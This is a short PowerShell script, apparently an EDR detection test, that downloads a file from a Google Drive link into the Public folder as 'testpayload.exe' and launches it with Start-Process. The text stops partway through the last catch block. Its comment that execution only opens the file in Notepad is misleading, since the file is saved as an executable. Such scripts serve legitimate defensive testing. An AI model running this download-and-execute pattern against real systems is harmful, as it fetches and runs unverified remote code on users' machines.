# Simulated Malicious Activity - EDR Trigger Test
# Safe to run in an isolated testing environment

# Define URL of a benign file (you can replace this with your own hosted file)
$Url = "https://drive.google.com/uc?export=download&id=1LRfAV0d645MM4hOQHThWy_BvDz-MpJqU"

# Define world-writable path
$Destination = "$env:PUBLIC\testpayload.exe"

# Download the file using Invoke-WebRequest (commonly abused method)
try {
    Invoke-WebRequest -Uri $Url -OutFile $Destination -UseBasicParsing
    Write-Host "File downloaded to $Destination"
} catch {
    Write-Host "Download failed: $_"
}

# Simulate execution (will just open the file in notepad if it's a text file)
try {
    Start-Process -FilePath $Destination
    Write-Host "Simulated execution: $Destination"
} catch {
    Write-Host "Execution failed: $_"
